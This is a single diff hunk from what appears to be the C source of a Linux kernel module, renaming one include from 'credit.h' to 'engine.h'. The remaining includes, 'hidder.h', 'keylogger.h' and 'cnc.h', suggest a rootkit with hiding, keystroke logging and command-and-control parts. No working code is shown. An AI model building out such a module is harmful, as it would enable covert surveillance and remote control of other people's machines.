@@ -2,7 +2,7 @@
 #include <linux/module.h>
 #include <linux/types.h>
 #include "hidder.h"
-#include "credit.h"
+#include "engine.h"
 #include "keylogger.h"
 #include "cnc.h"
 
